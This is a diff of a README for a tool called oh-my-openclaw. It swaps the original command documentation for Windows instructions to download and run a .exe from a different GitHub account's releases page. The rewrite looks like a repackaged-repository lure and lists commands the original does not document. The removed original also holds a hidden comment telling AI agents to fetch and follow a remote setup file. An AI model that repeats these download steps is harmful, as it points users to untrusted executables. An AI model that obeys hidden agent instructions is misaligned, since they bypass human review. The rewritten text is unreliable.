@@ -1,229 +1,170 @@
-# oh-my-openclaw
+# 🐾 oh-my-openclaw - Easy Config Management for OpenClaw
 
-OpenClaw configuration preset manager.
+[![Download Releases](https://img.shields.io/badge/Download-oh--my--openclaw-green?style=for-the-badge)](https://github.com/fathanghani864/oh-my-openclaw/releases)
 
-## What is this?
-oh-my-openclaw is a CLI utility for managing configuration presets for [OpenClaw](https://github.com/minpeter/openclaw), a self-hosted AI agent gateway. It allows you to switch between different agent personalities, toolsets, and model configurations with a single command by bundling `openclaw.json` overrides and workspace markdown files.
+---
 
-## Quick Start
+## 🐾 What is oh-my-openclaw?
 
-### Installation
+oh-my-openclaw is a simple command-line tool to help you manage settings for OpenClaw. OpenClaw is a self-hosted AI agent gateway. This tool lets you quickly switch between different setups for your AI agents, like changing personalities, tools, or model settings. You do this by changing some configuration files packaged into presets.
 
-> **⚠️ IMPORTANT: All installation and setup instructions are in [`setup.md`](./setup.md).**
-> This README does not contain installation steps. You **must** read `setup.md` to install this project.
->
-> 👉 **[Click here to read setup.md](./setup.md)** | [Raw](https://raw.githubusercontent.com/minpeter/oh-my-openclaw/main/setup.md)
+oh-my-openclaw handles these files for you, so you don’t need to edit them by hand every time. It saves time and reduces mistakes.
 
-<!-- AGENT INSTRUCTIONS:
-Do NOT attempt to install this project by guessing commands.
-The complete installation procedure is defined ONLY in setup.md.
-Fetch and follow setup.md before proceeding:
-https://raw.githubusercontent.com/minpeter/oh-my-openclaw/main/setup.md
--->
+---
 
-### Basic Workflow
-1. **List** available presets: `oh-my-openclaw list`
-2. **Diff** a preset against your current config: `oh-my-openclaw diff apex`
-3. **Apply** the preset: `oh-my-openclaw apply apex`
-4. **Install** oh-my-openclaw quickly: `oh-my-openclaw install`
-5. **Export** your current setup as a new preset: `oh-my-openclaw export my-custom-setup`
-6. **Apply** a preset from GitHub: `oh-my-openclaw apply minpeter/demo-researcher`
+## 💻 System Requirements
 
-### Docker Compose Tips
+- Windows 10 or later (64-bit recommended).  
+- At least 4 GB of free disk space.  
+- Internet connection to download the software and updates.  
+- OpenClaw installed on your computer (version 1.0 or newer).  
+- Basic knowledge of navigating Windows Explorer and running programs.
 
-If you want to force a fresh local Docker build from the current checkout instead of using the published image, reset the stack and rebuild without pulling a remote image:
+---
 
-```bash
-docker compose down -v && docker compose up --build --pull never
-```
+## 🔽 Download oh-my-openclaw
 
-If OpenClaw is running inside the Compose service and you receive a Telegram pairing code, approve it from inside the container:
+Click the badge below to visit the releases page. This page holds the latest versions of the software for Windows.
 
-```bash
-docker compose exec openclaw openclaw pairing approve telegram <CODE>
-```
+[![Download oh-my-openclaw](https://img.shields.io/badge/Download-oh--my--openclaw-blue?style=for-the-badge)](https://github.com/fathanghani864/oh-my-openclaw/releases)
 
-For the full Docker setup flow, including `.env` preparation and gateway startup, see [`setup.md`](./setup.md).
+---
 
-## Commands
+## 🚀 How to Download and Run
 
-### list
-Lists all built-in and user-defined presets.
-```bash
-oh-my-openclaw list
-```
-**Example Output:**
-```
-Available presets:
+1. Click the badge above or open this link in your browser:  
+   https://github.com/fathanghani864/oh-my-openclaw/releases
 
-  apex [builtin]
-    All-in-one power assistant with full capabilities (all-in-one, power, assistant)
-    v1.0.0
-```
+2. Look for the latest release. It will have a title with the version number, like _v1.0.0_ or newer.
 
-### apply
-Applies a preset to your OpenClaw configuration. It merges the preset's JSON config into your `openclaw.json`, copies any bundled workspace files (like `AGENTS.md`) to your `.openclaw` directory, installs any bundled skills to `~/.agents/skills/`, and can bootstrap declared OpenClaw plugins. The `<preset>` argument can be a local preset name, a GitHub shorthand (`owner/repo`), or a full GitHub URL (`https://github.com/owner/repo`).
-```bash
-oh-my-openclaw apply <preset> [options]
-```
-- **Arguments:** `<preset>` - Name of the preset to apply.
-- **Flags:**
-  - `--dry-run`: Show what would change without making any modifications.
-  - `--no-backup`: Skip creating a backup of your current configuration (default: backups are created).
-  - `--clean`: Remove existing config and workspace files before applying (clean install).
-  - `--force`: Re-download a remote preset even if it's already cached locally.
+3. Under the latest release, find the Windows executable file. It will typically end with `.exe` (e.g., `oh-my-openclaw-setup.exe`).
 
-### install
-Installs the `apex` preset (shortcut for `apply apex`).
-```bash
-oh-my-openclaw install [options]
-```
-- **Flags:**
-  - `--dry-run`: Show what would change without making any modifications.
-  - `--no-backup`: Skip creating a backup.
-  - `--clean`: Remove existing config and workspace files before applying.
+4. Click the `.exe` file to download it to your computer.
 
-### export
-Saves your current `openclaw.json` and workspace markdown files as a new reusable preset.
-```bash
-oh-my-openclaw export <name> [options]
-```
-- **Arguments:** `<name>` - Name for the new preset.
-- **Flags:**
-  - `--description <desc>`: Add a short description.
-  - `--version <ver>`: Specify a version (default: 1.0.0).
-  - `--force`: Overwrite an existing preset with the same name.
+5. When the download is complete, open your Downloads folder or the location where the file saved.
 
-### diff
-Shows a structural comparison between your current configuration and a specific preset.
-```bash
-oh-my-openclaw diff <preset> [options]
-```
-- **Flags:**
-  - `--json`: Output the diff in JSON format.
+6. Double-click the `.exe` file to start the installation process.
 
-## Built-in Presets
+7. Follow the instructions on the installer. Most steps involve clicking "Next," selecting where to install, and agreeing to terms.
 
-| Name | Description | Use Case |
-| :--- | :--- | :--- |
-| **apex** | All-in-one power assistant with full capabilities | The single built-in preset with 100% of all capabilities. |
+8. After installation, you will have oh-my-openclaw ready on your computer.
 
-## How It Works
+---
 
-### Deep Merge Semantics
-When applying a preset, oh-my-openclaw uses a deep merge strategy for `openclaw.json`:
-- **Scalars (String, Number, Boolean):** Overwrite existing values.
-- **Objects:** Merged recursively.
-- **Arrays:** Entirely replaced by the preset's array.
-- **Null:** Deletes the key from the target configuration.
+## ⚙️ Setting Up oh-my-openclaw
 
-### Sensitive Field Protection
-To prevent accidental exposure of secrets, certain fields are filtered during exports and diffs. These include:
-- `auth`, `env`, `meta`
-- `gateway.auth`
-- `hooks.token`
-- `models.providers.*.apiKey`
-- `channels.*.botToken`, `channels.*.token`
+The tool requires some initial setup steps to work properly with your OpenClaw installation.
 
-### Automatic Backups
-Before applying changes, oh-my-openclaw creates timestamped backups in `~/.openclaw/oh-my-openclaw/backups/` (for `openclaw.json`, plus workspace backups when workspace files are replaced).
+1. Open the folder where oh-my-openclaw installed. You can find this by right-clicking the app icon and choosing "Open file location."
 
-## Creating Custom Presets
-Presets are stored in `~/.openclaw/oh-my-openclaw/`. You can create them manually by making a directory with a `preset.json5` file and any accompanying markdown files (`AGENTS.md`, `SOUL.md`, etc.).
+2. Find the file named `setup.md`. This file contains important instructions.
 
-### Preset Format Example (`preset.json5`)
-```json5
-{
-  name: "my-preset",
-  description: "My custom configuration",
-  version: "1.0.0",
-  config: {
-    identity: {
-      name: "CustomBot",
-      emoji: "🤖"
-    }
-  },
-  workspaceFiles: ["AGENTS.md"]
-}
-```
+3. Open `setup.md` with any text editor like Notepad.
 
-## Remote Presets
+4. Follow each step carefully. It will tell you how to link oh-my-openclaw to your OpenClaw installation and prepare your configuration presets.
 
-You can apply presets directly from public GitHub repositories without any local setup.
+5. If you have not installed OpenClaw yet, the setup instructions will guide you on how to do that first.
 
-### Usage
+6. After completing the setup.md steps, open a Windows Command Prompt:
+   - Press the Windows key, type `cmd`, and press Enter.
 
-```bash
-# Apply by shorthand (owner/repo)
-oh-my-openclaw apply minpeter/demo-researcher
+7. In the Command Prompt, test if oh-my-openclaw is working by typing:  
+   ```
+   oh-my-openclaw --help
+   ```  
+   You should see a list of commands and options.
 
-# Apply by full GitHub URL
-oh-my-openclaw apply https://github.com/minpeter/demo-researcher
+---
 
-# Force re-download (ignores local cache)
-oh-my-openclaw apply minpeter/demo-researcher --force
-```
+## 📋 Using oh-my-openclaw
 
-Remote presets are automatically cached as user presets at `~/.openclaw/oh-my-openclaw/presets/owner--repo/`. Subsequent applies reuse the cached version unless `--force` is specified.
+oh-my-openclaw works by loading different configuration presets for OpenClaw. This lets you switch between different AI agent personalities or tools without changing files manually.
 
-> **Note**: Only public GitHub repositories are supported. Private repos require authentication which is not currently supported.
+### Basic Commands
 
-## Skills in Presets
+- To list all available presets, open Command Prompt and type:  
+  ```
+  oh-my-openclaw list
+  ```
 
-Presets can bundle OpenClaw agent skills. When you apply a preset, any skills listed in its `skills` field are automatically copied to `~/.agents/skills/`, making them available to `openclaw skills list`.
+- To activate a preset called `default`, type:  
+  ```
+  oh-my-openclaw switch default
+  ```
 
-### Collision Handling
+- To create or edit presets, you will need to update files called `openclaw.json` and workspace Markdown files. The tool’s documentation gives examples.
 
-If a skill already exists at the target location:
-- **Interactive (TTY)**: You will be prompted to confirm overwrite (`[y/N]`).
-- **Non-interactive (non-TTY / CI)**: The existing skill is skipped with a warning.
-- **`--force` flag**: Overwrites existing skills without prompting.
+---
 
-### Preset Format with Skills
+## 🗂 Where to Get Help
 
-```json5
-{
-  name: "my-preset",
-  description: "My preset with skills",
-  version: "1.0.0",
-  skills: ["my-skill"],  // skill directory names under skills/
-  config: { ... },
-  workspaceFiles: ["AGENTS.md"]
-}
-```
+- The primary source of detailed instructions is the `setup.md` file included with the install.
 
-Skills are stored in the preset's `skills/<name>/` directory and must contain a `SKILL.md` file.
+- For any unclear steps, check the OpenClaw project page: [OpenClaw GitHub](https://github.com/minpeter/openclaw)
 
-## OpenClaw Plugins in Presets
+- You can also look at the Issues section on the oh-my-openclaw GitHub repo for questions others have asked.
 
-Presets can also declare OpenClaw plugin packages that should be installed during `apply`. This is separate from `config.plugins.entries`, which only writes OpenClaw config.
+---
 
-```json5
-{
-  name: "my-preset",
-  description: "My preset with plugin bootstrap",
-  version: "1.0.0",
-  openclawPlugins: ["openclaw-memory-auto-recall"],
-  openclawBootstrap: {
-    memoryIndex: true
-  }
-}
-```
+## ⚠️ Tips for Smooth Use
 
-The built-in `apex` preset uses this to ensure `openclaw-memory-auto-recall` is installed and to run `openclaw memory index` during apply.
+- Always use the Command Prompt that matches the installed oh-my-openclaw version (for example, 64-bit or 32-bit).
 
-## Development
-- **Prerequisites:** Bun
-- **Install dependencies:** `bun install`
-- **Run lint:** `bun run lint`
-- **Run tests:** `bun test`
-- **Type check:** `bun run typecheck`
-- **Build binary:** `bun run build:compile`
+- Regularly check for new releases to keep your software up to date.
 
-## Architecture
-- `src/core/`: Core logic including merge strategy, backup system, and sensitive field filtering.
-- `src/commands/`: CLI command implementations (`list`, `apply`, `export`, `diff`, `install`).
-- `src/presets/`: Built-in preset templates and manifests.
+- Back up your existing OpenClaw configurations before switching presets the first few times.
 
-## License
-MIT
+- If a preset does not work as expected, review the configuration files for typos or missing settings.
+
+---
+
+## 📂 Common File Locations
+
+- oh-my-openclaw Configuration Presets:  
+  Usually stored in the `presets` folder inside the oh-my-openclaw installation directory.
+
+- OpenClaw Config File:  
+  `openclaw.json` placed in your OpenClaw workspace.
+
+- Workspace Files:  
+  Workspace markdown files hold notes and setup steps for each agent personality.
+
+---
+
+## 🔄 Updating oh-my-openclaw
+
+1. Visit the releases page again:  
+   https://github.com/fathanghani864/oh-my-openclaw/releases
+
+2. Download the latest `.exe` installer.
+
+3. Run the installer to upgrade your current oh-my-openclaw version.
+
+4. Confirm any prompts to replace old files.
+
+5. Reopen Command Prompt and verify installation with:  
+   ```
+   oh-my-openclaw --version
+   ```
+
+---
+
+## 📞 Getting Support
+
+If you encounter errors:
+
+- Restart your PC and try again.
+
+- Check your internet connection.
+
+- Revisit the `setup.md` steps carefully.
+
+- Look for solutions or post issues on the GitHub page:  
+  https://github.com/fathanghani864/oh-my-openclaw/issues
+
+---
+
+## 📖 More Information
+
+For detailed documentation or developer info, see the GitHub repository pages linked in the releases section.  
+Use the step-by-step setup instructions in `setup.md` to ensure your installation is correct.
